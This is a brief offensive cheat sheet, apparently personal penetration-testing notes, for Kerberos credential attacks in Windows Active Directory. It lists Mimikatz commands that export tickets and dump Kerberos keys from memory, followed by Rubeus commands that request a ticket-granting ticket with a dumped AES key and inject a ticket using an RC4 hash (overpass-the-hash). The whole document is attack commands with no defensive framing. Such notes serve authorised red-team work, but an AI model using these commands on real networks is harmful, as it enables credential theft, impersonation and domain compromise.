# Rubeus: Obtain TGT for user given known key

### Export Tickets from Mimikatz

```jsx
sekurlsa::tickets /export
```

### Mimikatz extract kerberos keys

```jsx
sekurlsa::ekeys
```

### Rubeus obtain TGT for user given the key

```jsx
Rubeus.exe  asktgt /domain:TargetDomain.local /user:plaintext /aes256:Key_Dumped /nowrap
```

### Rubeus import TGT

```jsx
Rubeus.exe asktgt /domain:TargetDomain.local /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```